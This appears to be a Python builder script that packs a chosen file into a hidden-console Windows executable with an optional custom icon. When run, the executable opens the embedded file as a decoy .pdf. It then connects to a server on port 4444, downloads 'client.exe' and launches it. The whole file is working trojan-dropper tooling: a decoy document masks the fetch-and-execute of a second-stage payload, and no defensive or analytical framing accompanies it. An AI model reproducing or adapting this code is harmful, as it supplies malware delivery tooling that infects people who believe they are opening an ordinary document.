import base64
import sys
import os
import subprocess
import shutil
import re
import socket

APP_TEMPLATE = """
import base64
import os
import sys
import socket
import tempfile

BINARY_BASE64_DATA = "{base64_data}"
EMBEDDED_FILENAME = "{embedded_filename}.pdf"
SERVER_IP = "{server_ip}"
SERVER_PORT = {server_port}

def extract_and_open_file():
    try:
        binary_data = base64.b64decode(BINARY_BASE64_DATA)
    except Exception as e:
        print(f"Error decoding binary data: {{e}}")
        input("Press Enter to exit...")
        return

    # Separate paths
    # temp_dir = tempfile.gettempdir()
    # file_path = os.path.join(temp_dir, "embedded_" + EMBEDDED_FILENAME)

    file_path = os.path.join(os.getcwd(), EMBEDDED_FILENAME)
    client_path = os.path.join(os.getcwd(), "client.exe")

    # Write and open embedded file
    try:
        with open(file_path, "wb") as f:
            f.write(binary_data)
        os.startfile(file_path)
    except Exception as e:
        print(f"Failed to write/open embedded file: {{e}}")

    # Connect to server and download second file
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))

        msg = "REQ_PAYLOAD"
        s.sendall(len(msg).to_bytes(4, 'big') + msg.encode())

        # Receive file size
        size_bytes = s.recv(4)
        if len(size_bytes) < 4:
            return
        msg_len = int.from_bytes(size_bytes, 'big')
        file_size_str = b''
        while len(file_size_str) < msg_len:
            file_size_str += s.recv(msg_len - len(file_size_str))
        file_size = int(file_size_str.decode())

        # Receive file data
        with open(client_path, "wb") as f:
            received = 0
            while received < file_size:
                chunk = s.recv(min(4096, file_size - received))
                if not chunk: break
                f.write(chunk)
                received += len(chunk)

        s.close()
        os.startfile(client_path)

    except Exception as e:
        print(f"Socket error: {{e}}")

if __name__ == "__main__":
    extract_and_open_file()
"""


def create_delivery_script(file_path, icon_path=None):
    if not os.path.exists(file_path):
        print(f"File not found: {file_path}")
        sys.exit(1)

    output_script_name = "delivery_app.py"
    original_filename = os.path.basename(file_path)

    # Read binary data
    with open(file_path, "rb") as f:
        binary_data = f.read()
    base64_data = base64.b64encode(binary_data).decode()

    # Detect server IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        server_ip = s.getsockname()[0]
        s.close()
    except Exception:
        server_ip = "127.0.0.1"

    # Write Python script
    final_script = APP_TEMPLATE.format(
        base64_data=base64_data,
        embedded_filename=original_filename,
        server_ip=server_ip,
        server_port=4444
    )
    with open(output_script_name, "w", encoding="utf-8") as f:
        f.write(final_script)

    # Clean filename for exe
    clean_name = re.sub(r'[^\w\-_\.]', '', original_filename).replace('.', '_')
    if not clean_name:
        clean_name = "EmbeddedFile"
    exe_name = f"Extractor_{clean_name}"

    # Build PyInstaller command
    command = [
        sys.executable,
        "-m",
        "PyInstaller",
        "--onefile",
        "--noconsole",
        "--name", exe_name,
        output_script_name
    ]
    if icon_path and icon_path.lower().endswith(".ico"):
        command.append(f"--icon={icon_path}")

    try:
        subprocess.run(command, check=True)
    except subprocess.CalledProcessError as e:
        print(f"PyInstaller failed: {e}")
    finally:
        # Cleanup
        for f in [output_script_name, exe_name + ".spec"]:
            if os.path.exists(f): os.remove(f)
        for d in ['build', '__pycache__']:
            if os.path.exists(d): shutil.rmtree(d, ignore_errors=True)

if __name__ == "__main__":
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print("Usage: python windows_file_packer.py <file_path> [icon.ico]")
        sys.exit(1)
    icon = sys.argv[2] if len(sys.argv) == 3 else None
    create_delivery_script(sys.argv[1], icon)
